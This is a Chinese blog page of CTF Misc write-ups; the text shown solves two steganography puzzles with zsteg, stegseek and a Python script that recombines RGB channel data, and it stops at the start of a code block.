<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>星球朋友们问的一些来路不明的题 - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题
本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了
如有需要本文中涉及的题目附件，可以进我的 知识星球 获取
"><meta name=keywords content='CTF,Misc'><meta itemprop=name content="星球朋友们问的一些来路不明的题"><meta itemprop=description content="用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题
本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了
如有需要本文中涉及的题目附件，可以进我的 知识星球 获取"><meta itemprop=datePublished content="2026-01-13T15:20:11+08:00"><meta itemprop=dateModified content="2026-01-13T15:20:11+08:00"><meta itemprop=wordCount content="9025"><meta itemprop=keywords content="CTF,Misc"><meta property="og:url" content="https://goodlunatic.github.io/posts/bb1da35/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="星球朋友们问的一些来路不明的题"><meta property="og:description" content="用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题
本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了
如有需要本文中涉及的题目附件，可以进我的 知识星球 获取"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-01-13T15:20:11+08:00"><meta property="article:modified_time" content="2026-01-13T15:20:11+08:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Misc"><meta name=twitter:card content="summary"><meta name=twitter:title content="星球朋友们问的一些来路不明的题"><meta name=twitter:description content="用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题
本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了
如有需要本文中涉及的题目附件，可以进我的 知识星球 获取"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/bb1da35/ title="星球朋友们问的一些来路不明的题 - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/d0736a7/ title='CTF-Misc "雅"题共赏'><link rel=next type=text/html href=https://goodlunatic.github.io/posts/1ad9200/ title="[持续更新] CTF-Misc Guide"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/bb1da35/index.md title="星球朋友们问的一些来路不明的题 - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"星球朋友们问的一些来路不明的题","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/bb1da35\/"},"image":["https:\/\/www.nssctf.cn\/files\/2025\/8\/21\/8ce6223a1a.png"],"genre":"posts","keywords":"CTF, Misc","wordcount":9025,"url":"https:\/\/goodlunatic.github.io\/posts\/bb1da35\/","datePublished":"2026-01-13T15:20:11+08:00","dateModified":"2026-01-13T15:20:11+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/d0736a7/ title='CTF-Misc "雅"题共赏'>CTF-Misc "雅"题共赏</a></li><li class=related-item><a href=/posts/1ad9200/ title="[持续更新] CTF-Misc Guide">[持续更新] CTF-Misc Guide</a></li><li class=related-item><a href=/posts/8bf5633/ title="2025 鹏城杯联邦网络靶场协同攻防演练 Misc Writeup">2025 鹏城杯联邦网络靶场协同攻防演练 Misc Writeup</a></li><li class=related-item><a href=/posts/380aa02/ title="2025 古剑山全国大学生网络攻防大赛 Misc Writeup">2025 古剑山全国大学生网络攻防大赛 Misc Writeup</a></li><li class=related-item><a href=/posts/353513a/ title="2025 强网拟态防御国际精英挑战赛线下总决赛 Misc Writeup">2025 强网拟态防御国际精英挑战赛线下总决赛 Misc Writeup</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.webp alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>星球朋友们问的一些来路不明的题</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/ctf/ class=post-category title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a></span></div><div class=post-meta-line><span title="发布于 2026-01-13 15:20:11"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2026-01-13>2026-01-13</time></span>&nbsp;<span title="9025 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 9100 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 43 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title=星球朋友们问的一些来路不明的题><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#题目名称-sunset>题目名称 sunset</a></li><li><a href=#题目名称-大威天龙>题目名称 大威天龙</a></li><li><a href=#题目名称-外星的凯撒凯撒凯撒>题目名称 外星的凯撒凯撒凯撒</a></li><li><a href=#题目名称-图的点很奇怪>题目名称 图的点很奇怪</a></li><li><a href=#题目名称-cat技能兴鲁>题目名称 cat(技能兴鲁)</a></li><li><a href=#题目名称-被偷梁换柱的镜像>题目名称 被偷梁换柱的镜像</a></li><li><a href=#题目名称-莉可丽丝迅岚安全杯>题目名称 莉可丽丝(迅岚安全杯)</a></li><li><a href=#题目名称-电音>题目名称 电音</a></li><li><a href=#题目名称-coffee_loving_cat天权信安ctf>题目名称 Coffee_loving_cat(天权信安CTF)</a></li><li><a href=#题目名称-简单的图片xsctf联合招新赛>题目名称 简单的图片(XSCTF联合招新赛)</a></li><li><a href=#题目名称-mos>题目名称 mos</a></li><li><a href=#题目名称-misc-1>题目名称 Misc-1</a></li><li><a href=#题目名称-654321>题目名称 654321</a></li><li><a href=#题目名称-丢失的关键基础设施固件>题目名称 丢失的关键基础设施固件</a></li><li><a href=#题目名称-qrsacode>题目名称 QRSACode</a></li><li><a href=#题目名称-to2025天山固网>题目名称 to(2025天山固网)</a></li><li><a href=#题目名称-数字雨2025天山固网>题目名称 数字雨(2025天山固网)</a></li><li><a href=#题目名称-capture2025年浙江省信息通信业职业技能竟赛-数据安全管理员竞赛决赛>题目名称 capture(2025年浙江省信息通信业职业技能竟赛-数据安全管理员竞赛决赛)</a></li><li><a href=#题目名称-带密码的zip中国铁塔内部选拔赛>题目名称 带密码的zip(中国铁塔内部选拔赛)</a></li><li><a href=#题目名称-安全杂项1交通运输行业大赛>题目名称 安全杂项1(交通运输行业大赛)</a></li><li><a href=#题目名称-filepng某内部赛>题目名称 file.png(某内部赛)</a></li><li><a href=#题目名称-easy_crypto>题目名称 easy_crypto</a></li><li><a href=#题目名称-new>题目名称 new</a></li><li><a href=#题目名称-安全杂项10-交通运输行业大赛>题目名称 安全杂项10 (交通运输行业大赛)</a></li><li><a href=#题目名称-file2>题目名称 file2</a></li><li><a href=#题目名称-二维码画图>题目名称 二维码画图</a></li><li><a href=#题目名称-pic2>题目名称 PIC2</a></li><li><a href=#题目名称-flaggalf>题目名称 flag^galf</a></li><li><a href=#题目名称-base_2>题目名称 base_2</a></li><li><a href=#题目名称-deep-with-deep>题目名称 deep-with-deep</a></li><li><a href=#题目名称-python_jail>题目名称 python_jail</a></li><li><a href=#题目名称-bus>题目名称 bus</a></li><li><a href=#题目名称-att>题目名称 att</a></li><li><a href=#题目名称-你知道我的密码吗>题目名称 你知道我的密码吗？</a></li><li><a href=#题目名称-strangesystem2024数据安全产业人才积分争夺赛>题目名称 Strangesystem（2024数据安全产业人才积分争夺赛）</a></li><li><a href=#题目名称-xxxxxx2022-dasctf-x-su-三月春季挑战赛>题目名称 xxxxxx（2022 DASCTF X SU 三月春季挑战赛）</a></li><li><a href=#题目名称-未知>题目名称 未知</a></li><li><a href=#题目名称-特殊流量>题目名称 特殊流量</a></li><li><a href=#题目名称-theyearwewere162025黑龙江省赛>题目名称 the+year+we+were+16（2025黑龙江省赛）</a></li><li><a href=#题目名称-iec104>题目名称 IEC104</a></li><li><a href=#题目名称-comstego_14>题目名称 comstego_14</a></li><li><a href=#题目名称-easyimg2022天权信安杯>题目名称 Easyimg（2022天权信安杯）</a></li><li><a href=#题目名称-misc_1>题目名称 misc_1</a></li><li><a href=#题目名称-像素2025-安徽省赛>题目名称 像素（2025 安徽省赛）</a></li><li><a href=#题目名称-kof>题目名称 KOF</a></li><li><a href=#题目名称-代码之神>题目名称 代码之神</a></li><li><a href=#题目名称-modbus>题目名称 modbus</a></li><li><a href=#题目名称-kobetea>题目名称 KobeTea</a></li><li><a href=#题目名称-yijian霜寒十四州2025-全国大学生信息安全竞赛-新疆赛区>题目名称 yijian霜寒十四州（2025 全国大学生信息安全竞赛 新疆赛区）</a></li><li><a href=#题目名称-copyright隐写>题目名称 Copyright隐写</a></li><li><a href=#题目名称-最后的-rgb>题目名称 最后的 R.G!B?</a></li><li><a href=#题目名称-数据恢复溯源2025数信杯>题目名称 数据恢复溯源（2025数信杯）</a></li></ul></nav></div></div><div class=content id=content><p><strong>用这篇博客来记录一下知识星球里朋友们问的一些 Misc 题</strong></p><p><strong>本文涉及的大部分题都来自于师傅们的提问，因此文中就不放具体附件的下载链接了</strong></p><p><strong>如有需要本文中涉及的题目附件，可以进我的 <a href=https://t.zsxq.com/an6p6 target=_blank rel="external nofollow noopener noreferrer">知识星球</a> 获取</strong></p><div class="details admonition success open"><div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-check" aria-hidden=true></i>阅前须知<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p><strong>因为本文的题目大都来源于群友的提问，因此我文章中就不放具体的附件下载链接了</strong></p><p><strong>如果有需要题目附件的师傅，可以进我的 <a href=https://t.zsxq.com/an6p6 target=_blank rel="external nofollow noopener noreferrer">知识星球</a> 获取附件下载链接</strong></p></div></div></div><h2 class=heading-element id=题目名称-sunset><span>题目名称 sunset</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-sunset class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了下面这张图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20240612143721666.png alt=/posts/bb1da35/imgs/image-20240612143721666.png height=955 width=1911></p><p>上手用 zsteg 扫一下，发现 RGB 三个通道中都藏了一个压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20240612143859073.png alt=/posts/bb1da35/imgs/image-20240612143859073.png height=927 width=1734></p><p>因此我们用以下命令分别导出三个压缩包</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>zsteg -e b1,r,lsb,xy sunset.png &gt; 1.zip
</span></span><span class=line><span class=cl>zsteg -e b1,g,lsb,xy sunset.png &gt; 2.zip
</span></span><span class=line><span class=cl>zsteg -e b1,b,lsb,xy sunset.png &gt; 3.zip</span></span></code></pre></td></tr></table></div></div><p>解压后分别得到 r.txt g.txt b.txt ，因此猜测是分别导出了三个通道的 hexdump</p><p>我们使用以下脚本把三个通道的数据组合一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_channel_data</span><span class=p>(</span><span class=n>file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>channel_data</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>formatted_data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>channel_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>formatted_data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>data</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>formatted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>combine_channels_to_bytes</span><span class=p>(</span><span class=n>r_data</span><span class=p>,</span> <span class=n>g_data</span><span class=p>,</span> <span class=n>b_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>binary_data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>r</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>r_data</span><span class=p>,</span> <span class=n>g_data</span><span class=p>,</span> <span class=n>b_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r_binary</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=mi>16</span><span class=p>))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>g_binary</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>g</span><span class=p>,</span> <span class=mi>16</span><span class=p>))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b_binary</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=mi>16</span><span class=p>))[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 逐位读取RGB合并后的二进制数据</span>
</span></span><span class=line><span class=cl>        <span class=n>binary_data</span> <span class=o>+=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>a</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>c</span> <span class=k>for</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                               <span class=n>c</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>r_binary</span><span class=p>,</span> <span class=n>g_binary</span><span class=p>,</span> <span class=n>b_binary</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>byte_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>binary_data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                      <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary_data</span><span class=p>),</span> <span class=mi>8</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>byte_data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># 读取并格式化 R、G、B 通道数据</span>
</span></span><span class=line><span class=cl>    <span class=n>r_data</span> <span class=o>=</span> <span class=n>read_channel_data</span><span class=p>(</span><span class=s1>&#39;r.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>g_data</span> <span class=o>=</span> <span class=n>read_channel_data</span><span class=p>(</span><span class=s1>&#39;g.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b_data</span> <span class=o>=</span> <span class=n>read_channel_data</span><span class=p>(</span><span class=s1>&#39;b.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 合并通道数据成字节数据</span>
</span></span><span class=line><span class=cl>    <span class=n>byte_data</span> <span class=o>=</span> <span class=n>combine_channels_to_bytes</span><span class=p>(</span><span class=n>r_data</span><span class=p>,</span> <span class=n>g_data</span><span class=p>,</span> <span class=n>b_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 将字节数据写入文件</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;1.zip&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f_out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f_out</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>byte_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Done&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>组合后可以得到一个 zip 压缩包，解压后即可得到 flag</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20240612144707833.png alt=/posts/bb1da35/imgs/image-20240612144707833.png height=95 width=471></p><h2 class=heading-element id=题目名称-大威天龙><span>题目名称 大威天龙</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%a4%a7%e5%a8%81%e5%a4%a9%e9%be%99 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个DOC和一个加密的RAR压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162427407.png alt=/posts/bb1da35/imgs/image-20241217162427407.png height=865 width=1723></p><p>RAR压缩包的注释中有提示</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162453240.png alt=/posts/bb1da35/imgs/image-20241217162453240.png height=865 width=1723></p><p>然后用010打开那个doc，发现其实是一个ZIP压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162534874.png alt=/posts/bb1da35/imgs/image-20241217162534874.png height=1327 width=1968></p><p>改后缀为.zip然后解压，在<code>gogog</code>路径下可以得到一张JPG图片</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162629300.jpeg alt=/posts/bb1da35/imgs/image-20241217162629300.jpeg height=931 width=1411></p><p>结合之前RAR注释中的提示，猜测就是steghide隐写，因此我们直接使用stegseek进行爆破</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162848465.png alt=/posts/bb1da35/imgs/image-20241217162848465.png height=266 width=1734></p><p>可以得到一个txt文件，内容如下</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217162955725.png alt=/posts/bb1da35/imgs/image-20241217162955725.png height=479 width=1033></p><p>因此压缩包解压密码就是：<code>恭喜你找到了rar压缩包的密码，快去解压吧！</code></p><blockquote><p>Tips:这里有的师傅用010打开会发现看不到中文，是因为这里使用的是GBK编码，可以使用记事本或者CyberChef查看</p></blockquote><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217163150370.png alt=/posts/bb1da35/imgs/image-20241217163150370.png height=1475 width=2556></p><p>解压RAR压缩包后可以得到一张PNG图片和一个filename.c的代码</p><p>猜测图片被这个代码加密了，因此我们尝试逆向这个代码，结果发现原来的Python代码就写在注释里</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217163442113.png alt=/posts/bb1da35/imgs/image-20241217163442113.png height=1528 width=2560></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241217163637471.png alt=/posts/bb1da35/imgs/image-20241217163637471.png height=1528 width=2560></p><p>因此直接写个脚本还原一下flag.png即可，还原后可以得到一张二维码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
